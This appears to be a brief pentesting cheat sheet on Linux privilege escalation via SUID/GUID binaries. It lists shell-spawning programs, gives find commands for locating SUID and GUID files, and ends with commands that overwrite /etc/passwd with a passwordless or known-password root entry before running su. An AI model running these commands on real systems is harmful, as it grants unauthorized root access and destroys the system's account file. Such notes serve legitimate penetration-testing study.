# suid and guid Misconfiguration

## Overview

* when a binary with suid permission is run it is run as another user, and therefore with the other users privileges
* it could be root, or just another user
* if the suid-bit is set on a program that can spawn a shell or in another way be abuse we could use that to escalate our privileges.
* for example, these are some programs that can be used to spawn a shell

```bash
nmap
vim
less
more
```

* if these programs have suid-bit set we can use them to escalate privileges too
* for more of these and how to use the see the next section about abusing sudo-rights

```bash
nano
cp
mv
find
```

## Find Suid and Guid Files

* find SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

* find GUID

```bash
find / -perm -g=s -type f 2>/dev/null
```

## Is /etc/passwd Writable?

```
echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su
# or
echo "root:JblITMXA7I1hg:0:0:root:/root:/bin/bash" > /etc/passwd
# then su using password rowbot 
```
